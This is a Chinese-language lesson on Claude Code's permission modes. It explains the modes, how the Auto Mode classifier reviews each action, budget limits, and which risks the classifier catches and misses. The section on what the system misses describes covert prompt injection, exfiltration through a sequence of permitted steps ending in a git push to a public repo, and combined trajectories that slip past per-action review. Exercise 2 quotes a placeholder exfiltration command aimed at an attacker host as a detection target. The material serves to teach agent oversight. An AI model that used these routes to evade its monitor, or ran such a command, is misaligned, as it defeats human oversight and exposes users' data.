# 自主 Agent 的权限模式

> 权限阶梯是一组渐进式自主级别，从“审查每项操作”到“批准所有操作”，harness 通过它来管理自主 Agent 无需询问即可执行的操作。作为本课完整示例的 Claude Code 提供六种此类模式：“plan”会在每项操作前询问；“default”（在 UI 中标记为“Manual”）只会针对高风险操作询问；“acceptEdits”会自动批准文件写入，但仍会要求确认 shell 执行；“bypassPermissions”则会批准一切。Auto Mode，即 `auto` 权限模式，会使用一个独立的 classifier Model 取代逐项操作审批；该 Model 会在每项操作运行前进行审查，并阻止任何超出请求范围的权限升级。操作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。`auto` 是否可用取决于套餐、组织是否启用、Model 和提供商；Anthropic 也明确指出，classifier 本身并不足够。

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator)
**Prerequisites:** Phase 15 · 01（长周期 Agent），Phase 15 · 09（Coding Agent 全景）
**Time:** ~45 分钟

## 问题

运行在你机器上的自主 Coding Agent 属于一个独立的安全类别。攻击面包括 Agent 能够访问的一切：文件系统、网络、凭据、剪贴板、任何浏览器标签页以及任何已打开的终端。Bruce Schneier 等人已经公开指出：computer-use Agent 并不是聊天机器人的一次“Feature 更新”，而是一种拥有全新风险特征的新型 Tool。

Claude Code 的权限系统是 Anthropic 给出的答案。它并未提供单一的“自主/非自主”开关，而是提供了横跨能力阶梯的六种模式：plan → default → acceptEdits → … → bypassPermissions。每种模式都代表速度与逐项操作审查之间的不同权衡。Auto Mode（2026 年 3 月）增加了一个独立的 classifier Model，将审批移出用户的关键路径：它会在每项操作运行前进行审查，并阻止任何超出请求范围的权限升级。

Engineering 问题是：这个系统能捕获什么、会漏掉什么，以及一项给定任务实际上适合哪种模式？

## 概念

### 六种权限模式

| 模式 | 行为 | 适用场景 |
|---|---|---|
| `plan` | Agent 提出计划；用户批准完整计划；每项操作都在执行前接受审查 | 不熟悉的任务；接近生产环境的代码；首次在某个 Repo 上使用 Agent |
| `default` | 在 UI 中标记为“Manual”。Agent 执行操作；遇到任何“高风险”操作（shell 执行、破坏性操作、网络调用）时提示用户 | 大多数交互式 Coding 会话 |
| `acceptEdits` | 自动批准文件写入；shell 执行和网络调用仍会提示 | 跨多个文件的重构过程 |
| `auto` | 一个独立的 classifier Model 会在每项操作运行前进行审查；阻止任何超出请求范围的权限升级 | 受约束工作区中的长周期无人值守运行 |
| `dontAsk` | 从不提示；权限规则未预先批准的操作会被拒绝 | 临时 sandbox、CI Job、研究脚本 |
| `bypassPermissions` | 批准一切 | 文档说明其“仅适用于你愿意直接丢弃的临时容器” |

（以上名称与 Claude Code 公开文档一致；UI 将 `default` 标记为“Manual”。）

### 一页了解 Auto Mode

Auto Mode（发布于 2026 年 3 月 24 日）是首个将逐项操作审批委托给 Model 的权限模式。其结构如下：

1. **一个独立的 classifier Model。** 它会在每项拟议操作运行前进行审查，并根据已声明的任务和会话当前状态作出判断，阻止任何超出请求范围的权限升级。被阻止的操作会回退给用户处理。
2. **受限的可用性。** 是否提供 `auto` 取决于套餐、组织是否启用、Model 和提供商。

预算控制与 classifier 配合使用：

- `max_turns` — 会话中的总迭代次数。
- `max_budget_usd` — 触发会话中止的美元支出上限。
- 每个 Tool 的操作次数限制（例如 `WebFetch` 调用不得超过 N 次）。

### 系统能够捕获什么

- Tool 输入中直接的 Prompt injection，且注入指令对应一种已知的高风险操作模式。
- 重复的 Tool 循环，即 classifier 可以看到操作 N+1 与操作 N 几乎完全相同，并连续出现了五次。
- 在原本仅限文件编辑的会话中，明显超出范围的 shell 命令。

### 系统可能漏掉什么

- **隐蔽的 Prompt injection**：它会调节行为，却不会产生任何一项被标记的操作。间接 Prompt injection 并不是可以彻底修补的漏洞（OpenAI preparedness 负责人，2025 年，针对浏览器 Agent 的观点，参见 Lesson 11）。
- **语义层面的不当行为。** 每项单独操作看起来都可能是安全的，但组合后的轨迹却是有害的。classifier 判断的是操作；它不会重新推导用户意图。
- **通过合法渠道外泄。** 先将数据写入你拥有的文件，再通过 `git push` 推送到公开 Repo，这是一系列各自被允许、但组合起来存在问题的操作。

### Research preview 定位

Anthropic 以 Research preview 的形式发布 Auto Mode。文档明确指出，classifier 是一道防护层，而不是完整解决方案：用户应将 Auto Mode 与预算、allowlist、隔离工作区和轨迹审计结合使用（Lessons 12–16）。Research preview 的定位也反映了文档所述的 Evaluation 与部署之间的差距（Lesson 1）：通过离线 Evaluation 的 classifier，在用户 Context 含糊不清的真实会话中可能表现不同。

### 这套阶梯如何融入你的工作流

- 不熟悉的任务：从 `plan` 开始。阅读计划的成本低于回滚一次糟糕的运行。
- 已知重构：`acceptEdits` 可以省去大量确认点击。
- 无人值守的后台运行：仅在已经评估过影响范围的工作区中使用 `auto`，其中不应包含凭据、生产环境挂载，也不应存在未经你主动允许的出站访问。
- 临时容器：当且仅当容器及其中的凭据均可丢弃时，才适合使用 `dontAsk` / `bypassPermissions`。

```figure
autonomy-oversight
```

## 实际使用

`code/main.py` 将操作审查 classifier 模拟为一个两阶段 pipeline。这是为了教学而做的简化；真实的 `auto` 模式由独立的 classifier Model 支持，并不是一个已有文档规定的两阶段契约。Stage 1 对拟议操作执行成本较低的关键词规则；Stage 2 是速度较慢的多规则审查器。driver 会输入一段简短的合成轨迹（安全操作、一次 Prompt injection 尝试和一个重复循环），并展示 classifier 能捕获什么、会漏掉什么。

## 交付成果

`outputs/skill-permission-mode-picker.md` 会根据任务描述匹配合适的权限模式、预算上限和必要的隔离措施。

## 练习

1. 运行 `code/main.py`。哪一种合成操作类型从不会被 Stage 1 标记，却总是会被 Stage 2 捕获？哪一种不会被二者中的任何一个捕获？

2. 扩展 Stage 1 规则集，使其能够捕获一种具体的已知恶意模式（例如 `curl $ATTACKER/exfil`）。在良性操作样本上测量误报率。

3. 阅读 Anthropic 的“How the agent loop works”文档。列出 Agent 在 `default` 模式下默认会接触的所有外部状态。在无人值守运行 `auto` 之前，哪些状态需要单独设置 gate？

4. 设计一套用于 24 小时无人值守运行的预算：`max_turns`、`max_budget_usd`、每个 Tool 的上限和 allowlist。说明每个数值的理由。

5. 描述一条轨迹，其中每项单独操作都获得 classifier 批准，但组合后的行为却没有对齐目标。（Lesson 14 将介绍 kill switch 和 canary Token 如何解决这一问题。）

## 关键术语

| 术语 | 人们常说 | 它的实际含义 |
|---|---|---|
| 权限模式 | “Agent 能做多少事” | 控制逐项操作审批的六种命名策略之一 |
| plan 模式 | “做任何事前都先询问” | Agent 编写计划；用户批准后才执行 |
| acceptEdits | “让它写文件” | 自动批准文件写入；shell 执行仍会提示 |
| auto | “自动审批” | 独立的 classifier Model 审查每项操作；阻止超出请求范围的权限升级 |
| bypassPermissions | “完全 YOLO” | 批准一切；适用于临时容器 |
| Stage 1（模拟器） | “快速关键词检查” | `code/main.py` 中针对拟议操作执行的低成本规则 |
| Stage 2（模拟器） | “深度审查” | `code/main.py` 中用于审查被标记操作、速度较慢的多规则审查器 |
| Research preview | “尚未 GA” | Anthropic 对故障模式仍在探索中的 Feature 所采用的定位 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — 权限模式、预算和操作格式。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — 托管服务执行 Model。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — Feature 范围和 Auto Mode 公告。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 塑造 classifier 判断的基于理由的防护层。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — 关于长周期权限设计的内部视角。
